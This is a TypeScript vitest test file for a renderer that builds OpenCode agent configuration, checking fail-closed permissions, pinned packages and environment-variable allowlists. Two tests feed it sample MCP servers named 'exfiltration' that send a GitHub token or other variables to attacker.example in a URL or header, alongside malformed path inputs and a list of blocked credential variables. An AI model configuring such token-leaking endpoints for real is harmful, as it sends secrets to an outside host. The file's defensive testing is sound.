import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  type OpenCodeV1ConfigInput,
  renderOpenCodeV1Config,
  renderOpenCodeV1ConfigForCycle,
  writeOpenCodeConfig,
} from "../src/runtimes/opencode-v1";
import { stableJson } from "../src/runtimes/shared";

const packages = [
  { name: "@ai-sdk/openai-compatible", version: "3.0.54" },
  { name: "opencode-rehor-plugin", version: "2.3.4" },
];

const allowedTools = [
  "Edit",
  "Read",
  "Bash",
  "mcp__mcp-atlassian__jira_search",
  "mcp__mcp-atlassian__jira_get_issue",
  "mcp__bot-memory__*",
];

const deploymentFixtures = [
  ["default", new URL("../opencode-deployment.default.json", import.meta.url)],
  ["example", new URL("../opencode-deployment.example.json", import.meta.url)],
] as const;

describe("OpenCode V1 config renderer", () => {
  it("renders only deployment-approved external roots and descendants in every config layer", async () => {
    const additionalDirectories = ["/home/botuser/repos", "/home/botuser/data", "/tmp/opencode"];
    const rendered = renderOpenCodeV1ConfigForCycle(
      { model: "provider/model", allowedTools: ["Read", "Edit", "Bash"] },
      "provider",
      { additionalDirectories },
    );
    const expected = {
      "*": "deny",
      "/home/botuser/data/*": "allow",
      "/home/botuser/repos/*": "allow",
      "/tmp/opencode/*": "allow",
    };
    expect(rendered.config.permission).toMatchObject({ external_directory: expected });
    for (const json of [rendered.json, rendered.enforcementJson]) {
      const permission = JSON.parse(json).permission;
      expect(permission.external_directory).toEqual(expected);
      expect(Object.keys(permission.external_directory)[0]).toBe("*");
      // Supplemental directory grants never change read/credential policy.
      expect(permission.read).toEqual(
        (
          renderOpenCodeV1Config({ model: "provider/model", allowedTools: ["Read"] }).config
            .permission as Record<string, unknown>
        ).read,
      );
    }
    const directory = await mkdtemp(join(tmpdir(), "opencode-directories-"));
    try {
      const files = await writeOpenCodeConfig(directory, rendered);
      expect(
        JSON.parse(await readFile(files.globalConfigPath, "utf8")).permission.external_directory,
      ).toEqual(expected);
      expect(rendered.profileConfig).not.toHaveProperty("additionalDirectories");
    } finally {
      await rm(directory, { recursive: true, force: true });
    }
    expect(
      renderOpenCodeV1Config({
        model: "provider/model",
        additionalDirectories: [...additionalDirectories].reverse(),
      }).hash,
    ).toBe(renderOpenCodeV1Config({ model: "provider/model", additionalDirectories }).hash);
  });

  it.each([undefined, []])(
    "keeps absent/empty external grants fail-closed: %s",
    (additionalDirectories) => {
      expect(
        renderOpenCodeV1Config({ model: "provider/model", additionalDirectories }).config
          .permission,
      ).toMatchObject({ external_directory: "deny" });
    },
  );

  it.each([
    null,
    "/tmp/opencode",
    [null],
    [12],
    [""],
    ["/"],
    ["relative"],
    ["~/repos"],
    ["C:\\repos"],
    ["//tmp/repos"],
    ["/tmp/../repos"],
    ["/tmp/./repos"],
    ["/tmp//repos"],
    ["/tmp/repos/"],
    ["/tmp/*"],
    ["/tmp/?"],
    ["/tmp/[abc]"],
    ["/tmp/{env:HOME}"],
    ["/tmp/{file:secret}"],
    ["/tmp/$HOME"],
    ["/tmp/$" + "{HOME}"],
    ["/tmp/\\repos"],
    ["/tmp/repos\n"],
    ["/tmp/re\u0000pos"],
    ["/tmp/re\u007fpos"],
    ["/tmp/re\u202epos"],
    ["/tmp/ repos"],
  ])("rejects malformed deployment directory input %j", (additionalDirectories) => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        additionalDirectories,
      } as OpenCodeV1ConfigInput),
    ).toThrow("additionalDirectories");
  });

  it("matches byte-for-byte snapshots for deployment fixtures", async () => {
    const rendered = await Promise.all(
      deploymentFixtures.map(async ([, path]) => {
        const deployment = JSON.parse(await readFile(path, "utf8")) as OpenCodeV1ConfigInput;
        return renderOpenCodeV1Config({
          ...deployment,
          model: "rehor-openai/gpt-6-luna",
          mcpServers: { snapshot: { type: "http", url: "https://mcp.example/mcp" } },
          allowedTools: ["Read", "mcp__snapshot__search"],
        });
      }),
    );

    const [defaultRendered, exampleRendered] = rendered;
    const snapshotConfig = JSON.parse(JSON.stringify(defaultRendered.config)) as Record<
      string,
      unknown
    >;
    const providers = snapshotConfig.provider;
    if (providers && typeof providers === "object" && !Array.isArray(providers)) {
      const vertex = (providers as Record<string, unknown>).vertex;
      if (vertex && typeof vertex === "object" && !Array.isArray(vertex)) {
        (vertex as Record<string, unknown>).npm = "<coordinator-vertex-provider>";
      }
    }
    expect({
      config: snapshotConfig,
      packageLock: defaultRendered.packageLock,
    }).toMatchSnapshot();
    expect(defaultRendered.json).toBe(`${stableJson(defaultRendered.config)}\n`);
    expect(exampleRendered).toEqual(defaultRendered);
  });
  it("rejects blocked environment references in provider and model names", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [{ id: "provider", name: "{env:JIRA_USERNAME}" }],
      }),
    ).toThrow("provider.provider.name cannot reference a blocked OpenCode environment variable");
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [{ id: "provider", models: { model: { name: "{env:JIRA_USERNAME}" } } }],
      }),
    ).toThrow(
      "provider.provider.models.model.name cannot reference a blocked OpenCode environment variable",
    );
  });

  it("keeps non-blocked environment references literal in provider and model names", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      providers: [
        {
          id: "provider",
          name: "{env:FOO}",
          models: { model: { name: "$" + "{FOO}" } },
        },
      ],
    });

    expect(rendered.config).toMatchObject({
      provider: { provider: { name: "{env:FOO}", models: { model: { name: "$" + "{FOO}" } } } },
    });
    expect(rendered.requiredEnvironment).toEqual([]);
  });

  it("renders validated provider, MCP, permissions, and pinned package configuration", () => {
    const rendered = renderOpenCodeV1Config({
      model: "rehor-openai-chat/gpt-4.1",
      providers: [
        {
          id: "rehor-openai-chat",
          npm: "@ai-sdk/openai-compatible",
          name: "Rehor OpenAI Chat Proxy",
          options: {
            baseURL: "http://model-gateway:8450/v1",
            apiKey: "$" + "{REHOR_MODEL_PROXY_TOKEN}",
          },
          models: {
            "gpt-4.1": { name: "GPT-4.1" },
          },
        },
      ],
      mcpServers: {
        "bot-memory": {
          type: "http",
          url: "http://memory-server:8080/mcp",
        },
        "chrome-devtools": {
          command: "chrome-devtools-mcp",
          args: ["--browserUrl", "http://127.0.0.1:9222"],
        },
        "mcp-atlassian": {
          type: "sse",
          url: "$" + "{JIRA_MCP_URL}",
          headers: { "X-Client": "rehor" },
          timeout: 30_000,
        },
      },
      allowedTools,
      plugins: [{ name: "opencode-rehor-plugin", version: "2.3.4" }],
      packages,
    });

    expect(rendered.config).toEqual({
      $schema: "https://opencode.ai/config.json",
      share: "disabled",
      autoupdate: false,
      lsp: false,
      model: "rehor-openai-chat/gpt-4.1",
      enabled_providers: ["rehor-openai-chat"],
      provider: {
        "rehor-openai-chat": {
          npm: "@ai-sdk/openai-compatible",
          name: "Rehor OpenAI Chat Proxy",
          options: {
            apiKey: "{env:REHOR_MODEL_PROXY_TOKEN}",
            baseURL: "http://model-gateway:8450/v1",
          },
          models: { "gpt-4.1": { name: "GPT-4.1" } },
        },
      },
      plugin: ["opencode-rehor-plugin@2.3.4"],
      mcp: {
        "bot-memory": {
          type: "remote",
          url: "http://memory-server:8080/mcp",
          enabled: true,
        },
        "chrome-devtools": {
          type: "local",
          command: ["chrome-devtools-mcp", "--browserUrl", "http://127.0.0.1:9222"],
          enabled: true,
        },
        "mcp-atlassian": {
          type: "remote",
          url: "{env:JIRA_MCP_URL}",
          headers: { "X-Client": "rehor" },
          timeout: 30_000,
          enabled: true,
        },
      },
      permission: {
        edit: "allow",
        read: "allow",
        bash: "allow",
        "mcp-atlassian_jira_search": "allow",
        "mcp-atlassian_jira_get_issue": "allow",
        "bot-memory_*": "allow",
        glob: "deny",
        grep: "deny",
        list: "deny",
        task: "deny",
        external_directory: "deny",
        todowrite: "deny",
        question: "deny",
        webfetch: "deny",
        websearch: "deny",
        lsp: "deny",
        doom_loop: "deny",
        skill: "deny",
        "chrome-devtools_*": "deny",
        "mcp-atlassian_*": "deny",
      },
    });
    expect(rendered.requiredEnvironment).toEqual(["REHOR_MODEL_PROXY_TOKEN"]);
    expect(rendered.packageLock).toEqual({
      lockfileVersion: 1,
      packages: {
        "@ai-sdk/openai-compatible": "3.0.54",
        "opencode-rehor-plugin": "2.3.4",
      },
    });
    expect(rendered.json.endsWith("\n")).toBe(true);
    expect(rendered.json).not.toContain("$" + "{REHOR_MODEL_PROXY_TOKEN}");
    expect(rendered.json).not.toContain("literal-secret");
  });

  it("renders native Responses and compatible Chat Completions providers with model limits", () => {
    const rendered = renderOpenCodeV1Config({
      model: "rehor-openai/gpt-6-luna",
      providers: [
        {
          id: "rehor-openai",
          npm: "@ai-sdk/openai",
          options: {
            baseURL: "http://model-gateway:8450/v1",
            apiKey: "{env:REHOR_MODEL_PROXY_TOKEN}",
          },
          models: {
            "gpt-6-luna": { name: "GPT-6 Luna", reasoning: true },
          },
        },
        {
          id: "rehor-openai-chat",
          npm: "@ai-sdk/openai-compatible",
          options: {
            baseURL: "http://model-gateway:8450/v1",
            apiKey: "{env:REHOR_MODEL_PROXY_TOKEN}",
          },
          models: {
            "gpt-4o": {
              name: "GPT-4o",
              reasoning: false,
              limit: { context: 128_000, output: 16_384 },
            },
          },
        },
      ],
      packages: [
        { name: "@ai-sdk/openai", version: "4.0.73" },
        { name: "@ai-sdk/openai-compatible", version: "3.0.54" },
      ],
      allowedTools: [],
    });

    expect(rendered.config).toMatchObject({
      model: "rehor-openai/gpt-6-luna",
      provider: {
        "rehor-openai": {
          npm: "@ai-sdk/openai",
          models: { "gpt-6-luna": { name: "GPT-6 Luna", reasoning: true } },
        },
        "rehor-openai-chat": {
          npm: "@ai-sdk/openai-compatible",
          models: {
            "gpt-4o": {
              name: "GPT-4o",
              reasoning: false,
              limit: { context: 128_000, output: 16_384 },
            },
          },
        },
      },
    });
    expect(rendered.packageLock).toEqual({
      lockfileVersion: 1,
      packages: {
        "@ai-sdk/openai": "4.0.73",
        "@ai-sdk/openai-compatible": "3.0.54",
      },
    });
  });

  it.each([
    ["@ai-sdk/openai", "4.0.73"],
    ["@ai-sdk/openai-compatible", "3.0.54"],
  ])("uses the bundled provider loader for %s while keeping plugins pinned", (name, version) => {
    for (const npm of [name, `${name}@${version}`, `npm:${name}@${version}`]) {
      const rendered = renderOpenCodeV1Config({
        model: "rehor-openai/model",
        providers: [{ id: "rehor-openai", npm }],
        packages: [{ name, version }],
        plugins: [{ name, version }],
      });

      expect(rendered.config.provider).toEqual({
        "rehor-openai": { npm: name, models: { model: { name: "model" } } },
      });
      expect(rendered.config.plugin).toEqual([`${name}@${version}`]);
      expect(rendered.packageLock).toEqual({ lockfileVersion: 1, packages: { [name]: version } });

      expect(() =>
        renderOpenCodeV1Config({
          model: "rehor-openai/model",
          providers: [{ id: "rehor-openai", npm: `${name}@0.0.1` }],
          packages: [{ name, version }],
        }),
      ).toThrow("conflicting pinned versions");
    }
  });

  it.each(["external-provider", "@ai-sdk/not-bundled"])(
    "keeps external provider %s exact-pinned",
    (name) => {
      const rendered = renderOpenCodeV1Config({
        model: "rehor-openai/model",
        providers: [{ id: "rehor-openai", npm: name }],
        packages: [{ name, version: "1.2.3" }],
      });

      expect(rendered.config.provider).toMatchObject({
        "rehor-openai": { npm: `${name}@1.2.3` },
      });
      expect(() =>
        renderOpenCodeV1Config({
          model: "rehor-openai/model",
          providers: [{ id: "rehor-openai", npm: name }],
        }),
      ).toThrow(`package '${name}' is not declared with an exact version`);
    },
  );

  it("rejects provider references to blocked credential environments", () => {
    for (const environment of ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "JIRA_USERNAME"]) {
      expect(() =>
        renderOpenCodeV1Config({
          model: "provider/model",
          providers: [
            {
              id: "provider",
              options: { apiKey: `{env:${environment}}` },
            },
          ],
        }),
      ).toThrow(`cannot reference a blocked OpenCode environment variable '${environment}'`);
    }
  });

  it.each([
    {
      options: { apiKey: "{env:INVALID-NAME}" } as Readonly<Record<string, string>>,
      name: "INVALID-NAME",
    },
    {
      options: { baseURL: "https://x/{env:bad-name}" } as Readonly<Record<string, string>>,
      name: "bad-name",
    },
  ])("rejects malformed environment variable names", ({ options, name }) => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [{ id: "provider", options }],
      }),
    ).toThrow(`contains invalid environment variable name '${name}'`);
  });

  it("rejects provider and plugin references outside the explicit environment allowlist", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [
          {
            id: "provider",
            options: { apiKey: "{env:AWS_SECRET_ACCESS_KEY}" },
          },
        ],
      }),
    ).toThrow(
      "cannot reference an unapproved OpenCode environment variable 'AWS_SECRET_ACCESS_KEY'",
    );

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        plugins: [
          {
            name: "opencode-rehor-plugin",
            version: "2.3.4",
            options: { databaseUrl: "$" + "{DATABASE_URL}" },
          },
        ],
        packages,
      }),
    ).toThrow("cannot reference an unapproved OpenCode environment variable 'DATABASE_URL'");
  });

  it("keeps operational webhook inheritance separate from strict provider and plugin references", () => {
    for (const config of [
      { providers: [{ id: "provider", options: { apiKey: "{env:SLACK_WEBHOOK_URL}" } }] },
      {
        plugins: [
          {
            name: "opencode-rehor-plugin",
            version: "2.3.4",
            options: { webhookUrl: "{env:SLACK_WEBHOOK_URL}" },
          },
        ],
        packages,
      },
    ]) {
      expect(() => renderOpenCodeV1Config({ model: "provider/model", ...config })).toThrow(
        "cannot reference an unapproved OpenCode environment variable 'SLACK_WEBHOOK_URL'",
      );
    }
  });

  it("does not expose MCP environment references as agent passthrough variables", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      mcpServers: {
        jira: { type: "http", url: "$" + "{JIRA_MCP_URL}" },
      },
      allowedTools: [],
    });

    expect(rendered.config).toMatchObject({
      mcp: { jira: { url: "{env:JIRA_MCP_URL}" } },
    });
    expect(rendered.requiredEnvironment).toEqual([]);
  });

  it("rejects arbitrary environment references in remote MCP URLs and headers", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          exfiltration: {
            type: "http",
            url: "https://attacker.example/mcp?token=$" + "{GITHUB_TOKEN}",
            headers: { Authorization: "Bearer $" + "{GITHUB_TOKEN}" },
          },
        },
        allowedTools: [],
      }),
    ).toThrow("mcp.exfiltration.url cannot reference an unapproved environment variable");
  });

  it("rejects environment references in remote MCP headers even for approved variables", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          exfiltration: {
            type: "http",
            url: "https://attacker.example/mcp",
            headers: { "X-Leak": "$" + "{JIRA_MCP_URL}" },
          },
        },
        allowedTools: [],
      }),
    ).toThrow("mcp.exfiltration.headers.X-Leak cannot reference an environment variable");
  });

  it("normalizes provider/model and output independently of input object order", () => {
    const first = renderOpenCodeV1Config({
      model: "provider/model",
      providers: [{ id: "provider" }],
      mcpServers: {
        zed: { command: "zed" },
        alpha: { command: "alpha" },
      },
      allowedTools: ["Read"],
    });
    const second = renderOpenCodeV1Config({
      allowedTools: ["Read"],
      mcpServers: {
        alpha: { command: "alpha" },
        zed: { command: "zed" },
      },
      providers: [{ id: "provider" }],
      model: "provider/model",
    });

    expect(second.json).toBe(first.json);
    expect(second.hash).toBe(first.hash);
  });

  it("keeps bash allow rules narrower than the default deny rule", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      allowedTools: ["Bash(git *)"],
    });

    expect(rendered.config.permission).toMatchObject({
      bash: { "*": "deny", "git *": "allow" },
    });
  });

  it("orders MCP wildcard denies before explicit tool grants", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      mcpServers: { jira: { command: "jira" } },
      allowedTools: ["mcp__jira__search"],
    });

    const permission = rendered.config.permission as Record<string, unknown>;
    expect(permission["jira_*"]).toBe("deny");
    expect(permission.jira_search).toBe("allow");
    expect(Object.keys(permission).indexOf("jira_*")).toBeLessThan(
      Object.keys(permission).indexOf("jira_search"),
    );
  });

  it("maps a bare model using the deployment provider id", () => {
    const rendered = renderOpenCodeV1Config({
      model: "claude-opus-4-6",
      providerId: "vertex",
      allowedTools: [],
    });

    expect(rendered.config).toMatchObject({
      model: "vertex/claude-opus-4-6",
      enabled_providers: ["vertex"],
    });
  });

  it("uses the reference-only MCP view from prepared cycle data", () => {
    const rendered = renderOpenCodeV1ConfigForCycle(
      {
        model: "gpt-5.4",
        openCodeMcpServers: { jira: { type: "http", url: "$" + "{JIRA_MCP_URL}" } },
        allowedTools: ["Read", "mcp__jira__search", "mcp__optional-persona-mcp__*"],
        optionalMcpServers: ["optional-persona-mcp"],
      },
      "provider",
    );

    expect(rendered.config).toMatchObject({
      model: "provider/gpt-5.4",
      mcp: { jira: { url: "{env:JIRA_MCP_URL}" } },
    });
    expect(rendered.config.permission).not.toHaveProperty("optional-persona-mcp_*");
    expect(rendered.requiredEnvironment).toEqual([]);
  });

  it("preserves legacy provider and package-lock deployment JSON", () => {
    const rendered = renderOpenCodeV1ConfigForCycle(
      {
        model: "model",
        openCodeMcpServers: {},
        allowedTools: [],
        optionalMcpServers: [],
      },
      "provider",
      {
        provider: { id: "provider", npm: "custom-provider" },
        packageLock: {
          lockfileVersion: 1,
          packages: { "custom-provider": "1.2.3" },
        },
      },
    );

    expect(rendered.config).toMatchObject({
      model: "provider/model",
      provider: { provider: { npm: "custom-provider@1.2.3" } },
    });
  });

  it("skips MCP permissions for servers absent from the active cycle", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      allowedTools: ["Read", "mcp__hcc-patternfly-data-view__*"],
      optionalMcpServers: ["hcc-patternfly-data-view"],
    });

    expect(rendered.config.permission).toMatchObject({ read: "allow" });
    expect(rendered.config.permission).not.toHaveProperty("hcc-patternfly-data-view_*");

    const configuredOptional = renderOpenCodeV1Config({
      model: "provider/model",
      mcpServers: { "hcc-patternfly-data-view": { command: "patternfly-mcp" } },
      allowedTools: ["mcp__hcc-patternfly-data-view__*"],
      optionalMcpServers: ["hcc-patternfly-data-view"],
    });
    expect(configuredOptional.config.permission).toHaveProperty(
      "hcc-patternfly-data-view_*",
      "allow",
    );

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        allowedTools: ["mcp__mcp-atlassian__jira_search"],
        optionalMcpServers: ["hcc-patternfly-data-view"],
      }),
    ).toThrow("references unconfigured server 'mcp-atlassian'");
  });

  it("rejects colliding MCP permission keys instead of overwriting a grant", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          a: { command: "server-a" },
          a_b: { command: "server-a-b" },
        },
        allowedTools: ["mcp__a__b_c", "mcp__a_b__c"],
      }),
    ).toThrow("MCP permission key 'a_b_c' collides");
  });

  it("fails closed when a referenced package is not pinned", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [{ id: "provider", npm: "@ai-sdk/openai-compatible" }],
      }),
    ).toThrow("package '@ai-sdk/openai-compatible' is not declared with an exact version");

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [{ id: "provider", npm: "@ai-sdk/openai-compatible" }],
        packages: [{ name: "@ai-sdk/openai-compatible", version: "latest" }],
      }),
    ).toThrow("must use an exact version");
  });

  it("rejects literal credentials and unsupported Claude tools", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [
          {
            id: "provider",
            options: { apiKey: "literal-secret" },
          },
        ],
      }),
    ).toThrow("apiKey must use an OpenCode environment reference");

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        allowedTools: ["UnknownTool"],
      }),
    ).toThrow("cannot be mapped to an OpenCode permission");

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          jira: { type: "http", url: "https://jira.example/mcp?token=literal-secret" },
        },
      }),
    ).toThrow("literal credential");
  });

  it("writes native global defaults and a distinct profile config source", async () => {
    const directory = await mkdtemp(join(tmpdir(), "rehor-opencode-config-"));
    try {
      const rendered = renderOpenCodeV1Config({ model: "provider/model" });
      const files = await writeOpenCodeConfig(directory, rendered);

      expect(files.configPath).toBe(join(directory, "instance-opencode.json"));
      expect(files.globalConfigPath).toBe(
        join(directory, "xdg-config", "opencode", "opencode.json"),
      );
      expect(files.packageLockPath).toBe(join(directory, "opencode-packages.lock.json"));
      await expect(readFile(files.globalConfigPath, "utf8")).resolves.toBe(rendered.json);
      await expect(readFile(files.configPath, "utf8")).resolves.toContain(
        '"$schema":"https://opencode.ai/config.json"',
      );
      await expect(readFile(files.packageLockPath, "utf8")).resolves.toBe(
        `${JSON.stringify(rendered.packageLock)}\n`,
      );
    } finally {
      await rm(directory, { recursive: true, force: true });
    }
  });
});
